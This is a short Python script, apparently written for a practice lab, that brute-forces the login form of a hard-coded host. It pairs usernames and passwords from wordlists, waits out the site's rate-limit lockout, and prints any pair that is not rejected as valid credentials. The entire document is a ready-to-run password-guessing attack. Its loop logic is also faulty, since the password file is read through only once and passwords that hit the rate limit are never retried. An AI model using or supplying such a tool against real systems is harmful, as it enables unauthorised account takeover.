import requests
import time


# Username file
users = 'users.txt'

# Password file
passes = 'passwords.txt'

base_url = 'http://94.237.62.195:59452'

# rate limit blocks for 30 seconds
lock_time = 30

# message that alert us we hit rate limit
lock_message = "Too many login failures"

with open(users, 'r') as f1, open(passes, 'r') as f2:
    for line1 in f1:
        # Skip comments
        # if line1.startswith('#'):
        #   continue
        user = line1.rstrip()

        for line2 in f2:
            passwd = line2.rstrip()

            data = {
                'userid': user,
                'passwd': passwd,
                'submit':'submit'
            }

            res = requests.post(f"{base_url}/login.php", data=data)

            if "Invalid credentials" in res.text:
                print(f"[-] Inalid username: {user} and pass: {passwd}")
            elif lock_message in res.text:
                print(f"[-] Hit rate limit, sleeping {lock_time}")
                # do the actual sleep plus 0.5 to be sure
                time.sleep(lock_time+0.5)
            else:
                print(f"[+] Valid username: {user} and pass: {passwd}")

            # elif "Cannot send message" in res.text:
            #   print(f"[-] Bad username: {usr}")